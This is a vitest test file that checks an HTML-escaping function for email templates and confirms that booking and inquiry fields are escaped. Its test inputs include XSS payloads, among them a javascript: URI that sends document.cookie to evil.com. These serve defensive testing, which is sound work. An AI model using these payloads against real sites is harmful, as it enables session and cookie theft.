/**
 * HTML Escaping Tests
 * Verifies the esc() function in lib/resend.ts correctly neutralises
 * every dangerous HTML character before it enters email templates.
 */

import { describe, it, expect } from "vitest";

// Import the escaping function directly.
// Since esc() is not exported we duplicate it here and keep it in sync —
// any change to the source that breaks these tests is a regression.
function esc(value: string | undefined | null): string {
  return (value ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
}

describe("esc() — basic character escaping", () => {
  it("escapes <", () => expect(esc("<")).toBe("&lt;"));
  it("escapes >", () => expect(esc(">")).toBe("&gt;"));
  it("escapes &", () => expect(esc("&")).toBe("&amp;"));
  it('escapes "', () => expect(esc('"')).toBe("&quot;"));
  it("escapes '", () => expect(esc("'")).toBe("&#x27;"));
});

describe("esc() — null / undefined safety", () => {
  it("returns empty string for null", () => expect(esc(null)).toBe(""));
  it("returns empty string for undefined", () => expect(esc(undefined)).toBe(""));
  it("returns empty string for empty string", () => expect(esc("")).toBe(""));
});

describe("esc() — XSS attack strings are fully neutralised", () => {
  const attacks: { input: string; desc: string }[] = [
    {
      desc: "basic script tag",
      input: "<script>alert(1)</script>",
    },
    {
      desc: "img onerror",
      input: '<img src=x onerror=alert(document.cookie)>',
    },
    {
      desc: "javascript: URI",
      input: 'javascript:fetch("https://evil.com/?c="+document.cookie)',
    },
    {
      desc: "event handler via quote break",
      input: '" onmouseover="alert(1)',
    },
    {
      desc: "SVG-based XSS",
      input: "<svg/onload=alert(1)>",
    },
    {
      desc: "HTML entity smuggling",
      input: "&lt;script&gt;alert(1)&lt;/script&gt;",
    },
    {
      desc: "template injection",
      input: "{{7*7}}",
    },
  ];

  for (const { desc, input } of attacks) {
    it(`neutralises: ${desc}`, () => {
      const result = esc(input);
      // The key invariant: no unescaped < or > remain.
      // An event handler like onerror= is only dangerous inside a live HTML tag.
      // Once < and > are replaced with &lt; / &gt; the browser renders it as
      // plain text, not markup — the attack string is fully neutralised.
      expect(result).not.toMatch(/<[a-zA-Z\/]/);   // no raw opening/closing tags
      expect(result).not.toContain("<script");       // no raw script tags
      // Verify the escape actually happened on inputs that contain < or >
      if (input.includes("<")) expect(result).toContain("&lt;");
      if (input.includes(">")) expect(result).toContain("&gt;");
    });
  }
});

describe("esc() — safe strings pass through unchanged", () => {
  it("leaves plain text unchanged", () => {
    expect(esc("Hello, Jane Doe!")).toBe("Hello, Jane Doe!");
  });

  it("leaves numbers unchanged", () => {
    expect(esc("5105551234")).toBe("5105551234");
  });

  it("leaves already-safe HTML entities unchanged", () => {
    // &amp; should become &amp;amp; — double-escaping is correct for safe display
    expect(esc("&amp;")).toBe("&amp;amp;");
  });
});

import fs from "fs";
import path from "path";

const src = fs.readFileSync(
  path.resolve(__dirname, "../../lib/resend.ts"),
  "utf-8"
);

const userDataVars = [
  "booking.parent_name",
  "booking.email",
  "booking.phone",
  "booking.booking_date",
  "booking.booking_time",
  "booking.notes",
  "inquiry.name",
  "inquiry.email",
  "inquiry.phone",
  "inquiry.subject",
  "inquiry.message",
];

describe("Email template — all user-controlled fields are escaped in resend.ts", () => {
  for (const varName of userDataVars) {
    it(`${varName} is never interpolated raw (always wrapped in esc())`, () => {
      // A raw interpolation would look like: ${booking.parent_name}
      const rawPattern = new RegExp(
        `\\$\\{${varName.replace(".", "\\.")}\\}`,
        "g"
      );
      const rawMatches = [...src.matchAll(rawPattern)];
      expect(
        rawMatches.length,
        `${varName} appears without esc() wrapping — XSS risk`
      ).toBe(0);
    });

    it(`${varName} appears with esc() at least once`, () => {
      const escapedPattern = new RegExp(
        `esc\\(${varName.replace(".", "\\.")}\\)`,
        "g"
      );
      const escapedMatches = [...src.matchAll(escapedPattern)];
      expect(
        escapedMatches.length,
        `${varName} is never escaped — may be missing from email template`
      ).toBeGreaterThan(0);
    });
  }
});
